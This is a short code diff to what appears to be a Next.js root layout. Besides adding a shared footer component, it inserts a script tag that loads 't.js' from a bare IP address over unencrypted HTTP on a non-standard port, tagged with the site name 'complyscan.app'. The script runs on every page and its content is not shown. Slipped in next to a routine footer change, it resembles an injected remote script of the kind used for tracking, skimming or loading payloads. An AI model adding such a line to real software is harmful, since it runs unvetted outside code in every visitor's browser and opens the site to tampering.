@@ -17,6 +17,8 @@ export const metadata: Metadata = {
   },
 };
 
+import SharedFooter from "@/components/SharedFooter";
+
 export default function RootLayout({ children }: { children: React.ReactNode }) {
   return (
     <html lang="en">
@@ -28,6 +30,8 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
           strategy="lazyOnload"
         />
         {children}
+        <SharedFooter theme="dark" />
+        <script src="http://31.97.56.148:3098/t.js" data-site="complyscan.app" defer></script>
       </body>
     </html>
   );
